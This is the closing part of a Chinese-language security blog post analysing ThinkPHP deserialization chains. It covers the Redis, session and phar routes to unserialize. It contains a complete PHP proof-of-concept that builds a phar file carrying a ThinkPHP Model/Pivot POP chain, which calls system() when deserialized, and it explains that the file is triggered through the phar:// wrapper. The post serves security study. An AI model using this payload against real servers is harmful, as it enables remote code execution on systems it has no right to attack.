+<h2 id="原生反序列化"><a class="markdownIt-Anchor" href="#原生反序列化"></a> 原生反序列化</h2>
+<p>字面意思</p>
+<p>php自带的unserialize方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918151516506.png" alt="image-20240918151516506" /></p>
+<h2 id="redis模块"><a class="markdownIt-Anchor" href="#redis模块"></a> Redis模块</h2>
+<p>既然自带了unserialize方法，那么我们去tp框架搜索一下该方法，有没有什么方法是封装了这个函数的呢？</p>
+<ul>
+<li>不难发现redis模块的get方法获取键值的时候是调用反序列化方法的</li>
+</ul>
+<p>值以think_serialize开始会进行反序列化</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918152247395.png" alt="image-20240918152247395" /></p>
+<p><strong>当然高版本的get方法实现起来又不一样了，tp6是另一套写法，tp5这个实战比较多，就拿这个举例了</strong></p>
+<h2 id="session反序列化"><a class="markdownIt-Anchor" href="#session反序列化"></a> Session反序列化</h2>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+<p>ctf比较常见</p>
+<p>当然实战中也有产品能遇到，比如：<strong>瑞友天翼应用虚拟化</strong></p>
+<h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> Phar反序列化</h2>
+<p>phar反序列化是实战中的大头，先简单总结一下，phar文件的metadata部分存储的是反序列化数据，当使用phar协议处理文件时，会对这部分数据进行反序列化。（<strong>PHP8已经做了修复</strong>）</p>
+<p>主要影响的函数就是文件操作相关的。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1" /></p>
+<p>实际上很好理解：</p>
+<ol>
+<li>生成恶意的phar文件。（后缀无要求）</li>
+</ol>
+<p>代码上半部分是上面分析的pop链。</p>
+<p>下半部分重点把metadata部分设置成pop链的对象即可。</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+
+
+namespace think &#123;
+    
+    abstract class Model &#123;
+        
+        private $lazySave &#x3D; false;
+        private $data &#x3D; [];
+        private $exists &#x3D; false;
+        protected $table;
+        private $withAttr &#x3D; [];
+        protected $json &#x3D; [];
+        protected $jsonAssoc &#x3D; false;
+
+        
+        public function __construct($obj&#x3D;&#39;&#39;) &#123;
+            $this-&gt;lazySave &#x3D; true;
+            $this-&gt;data &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;calc&#39;]];
+            $this-&gt;exists &#x3D; true;
+            $this-&gt;table &#x3D; $obj;    
+            $this-&gt;withAttr &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;system&#39;]];
+            $this-&gt;json &#x3D; [&#39;calc&#39;];
+            $this-&gt;jsonAssoc &#x3D; true;
+        &#125;
+    &#125;
+&#125;
+
+namespace think\model &#123;
+    use think\Model;
+    class Pivot extends Model &#123;
+
+    &#125;
+   
+
+
+&#125;
+
+namespace&#123;
+    
+    $p &#x3D; new \think\model\Pivot(new \think\model\Pivot());
+    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;代码里面必须是phar后缀，生成完使用伪协议触发不需考虑后缀
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub
+    $phar-&gt;setMetadata($p); &#x2F;&#x2F;自定义metadata
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F; 添加文件
+    &#x2F;&#x2F;签名自动计算
+    $phar-&gt;stopBuffering();
+
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol start="2">
+<li>伪协议触发（实战中需要自己尝试上传文件）</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918161944044.png" alt="image-20240918161944044" /></p>
+<p><strong>分析到这里也能看到，我们代码中必须是整个参数都可以控制，这样才能控制phar前缀</strong></p>
+<h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251318#h2-2">https://www.anquanke.com/post/id/251318#h2-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11382">https://xz.aliyun.com/t/11382</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9310">https://xz.aliyun.com/t/9310</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-09-18 16:26:54
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/ThinkPHP/" title="ThinkPHP">
+                        #ThinkPHP
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text"> 0x01 反序列化利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF"><span class="toc-text"> 审计思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1thinkphp-50x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> ①ThinkPHP 5.0.x 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E8%B0%83%E9%80%9A%E8%BF%87%E7%A8%8B"><span class="toc-text"> 一、反序列化链调通过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-text"> 1. 寻找入口点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AF%BB%E6%89%BE%E4%B8%AD%E9%80%94%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text"> 2. 寻找中途的魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E6%89%BE%E5%88%B0%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-text"> 3.找到最终利用点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%9E%84%E9%80%A0%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text"> 4.构造完整利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E6%AD%BB%E4%BA%A1exit%E7%BB%95%E8%BF%87"><span class="toc-text"> 二、死亡exit绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-poc%E7%BC%96%E5%86%99"><span class="toc-text"> 三、POC编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-%E5%85%B6%E4%BB%96%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text"> 四、其他版本的反序列化链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2thinkphp-51x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> ②ThinkPHP 5.1.x 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E9%80%9A%E8%BF%87%E7%A8%8B"><span class="toc-text"> 一、反序列化调通过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-text"> 1. 入口点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-tostring-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text"> 2. ToString 魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%AD%E9%80%94%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-text"> 3. 中途利用点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%9E%84%E9%80%A0%E4%B8%AD%E9%80%94%E6%9D%A1%E4%BB%B6"><span class="toc-text"> 4.构造中途条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-poc%E7%BC%96%E5%86%99"><span class="toc-text"> 二、POC编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E5%85%B6%E4%BB%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text"> 三、其他反序列化链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3thinkphp-52x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> ③ThinkPHP 5.2.x 反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-thinkphp60x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> ④ ThinkPHP6.0.x 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E9%80%9A%E8%BF%87%E7%A8%8B-2"><span class="toc-text"> 一、反序列化调通过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E5%AF%BB%E6%89%BEtostring%E6%96%B9%E6%B3%95%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-text"> 1.寻找toString方法触发点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-poc%E7%BC%96%E5%86%99-2"><span class="toc-text"> 二、POC编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E5%85%B6%E4%BB%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="toc-text"> 三、其他反序列化链分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5thinkphp61x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> ⑤ThinkPHP6.1.x反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6thinkphp80x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> ⑥ThinkPHP8.0.x反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="toc-text"> 0x02 实战利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> 原生反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#redis%E6%A8%A1%E5%9D%97"><span class="toc-text"> Redis模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> Session反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text"> Phar反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text"> 参考链接</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/cyxsec">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://cyxsec.github.io/">Copyright © 2024 CysSec</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fcyxsec.github.io%2F2024%2F07%2FThinkPHP%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://cyxsec.github.io/2024/07/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
